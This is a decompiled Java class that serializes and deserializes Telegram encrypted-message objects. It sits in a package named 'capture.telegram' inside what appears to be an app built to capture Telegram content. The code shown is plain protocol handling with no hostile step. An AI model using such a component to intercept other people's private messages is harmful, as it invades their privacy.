package com.vvt.capture.telegram.internal;

public class TLRPC$TL_encryptedMessage
  extends TLRPC.EncryptedMessage
{
  public static int constructor = -317144808;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    long l = paramAbstractSerializedData.readInt64(paramBoolean);
    this.random_id = l;
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.chat_id = i;
    i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.date = i;
    Object localObject = paramAbstractSerializedData.readByteArray(paramBoolean);
    this.bytes = ((byte[])localObject);
    i = paramAbstractSerializedData.readInt32(paramBoolean);
    localObject = TLRPC.EncryptedFile.TLdeserialize(paramAbstractSerializedData, i, paramBoolean);
    this.file = ((TLRPC.EncryptedFile)localObject);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    long l = this.random_id;
    paramAbstractSerializedData.writeInt64(l);
    i = this.chat_id;
    paramAbstractSerializedData.writeInt32(i);
    i = this.date;
    paramAbstractSerializedData.writeInt32(i);
    byte[] arrayOfByte = this.bytes;
    paramAbstractSerializedData.writeByteArray(arrayOfByte);
    this.file.serializeToStream(paramAbstractSerializedData);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_encryptedMessage.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */